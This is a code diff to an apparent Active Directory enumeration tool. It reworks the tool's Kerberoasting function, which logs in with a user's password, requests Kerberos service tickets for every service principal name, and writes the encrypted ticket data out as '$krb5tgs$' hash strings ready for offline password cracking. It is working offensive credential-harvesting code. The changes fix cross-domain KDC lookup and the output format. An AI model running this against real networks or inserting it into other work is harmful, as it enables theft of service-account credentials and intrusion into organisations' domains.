@@ -782,11 +782,7 @@ class EnumAD():
         user_tickets = {
         }
 
-        kdcHost = self.domuser.split('@')[1]
-        #self.conn.search(self.dc_string[:-1], '(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))(sAMAccountName:={0}))'.format(self.domuser.split('@')[0]), attributes=self.ldapProps, search_scope=SUBTREE)
-        #for entry in self.conn.entries:
-        #    ent = json.loads(entry.entry_to_json())
-        #    users_spn[self.domuser] = self.splitJsonArr(ent["attributes"].get("servicePrincipalName"))
+        userDomain = self.domuser.split('@')[1]
 
         idx = 0
         for entry in self.spn:
@@ -798,7 +794,7 @@ class EnumAD():
         client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         try:
             # We need to take the domain from the user@domain since it *could* be a cross-domain user
-            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', kdcHost, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=kdcHost)
+            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=None)
 
             TGT = {}
             TGT['KDC_REP'] = tgt
@@ -814,10 +810,9 @@ class EnumAD():
                     try:
                         # Get the TGS
                         serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, kdcHost, kdcHost, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
+                        tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
                         # Decode the TGS
                         decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-
                         # Get different encryption types
                         if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
                             entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
@@ -831,9 +826,6 @@ class EnumAD():
                         elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
                             entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                             user_tickets[spn] = entry
-                        else:
-                            # It might be a referral ticket
-                            print(decoded)
 
                     except KerberosError:
                         # For now continue
@@ -842,7 +834,9 @@ class EnumAD():
 
             if len(user_tickets.keys()) > 0:
                 with open('{0}-spn-tickets'.format(self.server), 'w') as f:
-                    json.dump(user_tickets, f, sort_keys=False)
+                    for key, value in user_tickets.items():
+                        #json.dump(user_tickets, f, sort_keys=False)
+                        f.write('{0}:{1}\n'.format(key, value))
                 if len(user_tickets.keys()) == 1:
                     print('[ ' + colored('OK', 'yellow') +' ] Wrote {0} ticket for Kerberoasting'.format(len(user_tickets.keys())))
                 else:
@@ -852,7 +846,6 @@ class EnumAD():
 
 
         except KerberosError as err:
-            print(err)
             print('[ ' + colored('NOT OK', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
             pass
 
